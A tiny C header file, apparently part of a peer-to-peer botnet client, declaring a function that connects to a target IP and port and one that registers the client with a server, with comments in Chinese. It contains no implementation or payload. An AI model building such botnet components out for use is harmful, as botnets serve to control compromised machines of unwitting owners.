#ifndef P2PBOTNET_CLIENT_H
#define P2PBOTNET_CLIENT_H

//输入连接的目标IP和端口，返回连接套接字；
int init_client(const char*,const int);
//客户端向服务端注册函数；
int registerPeer(int, int);
#endif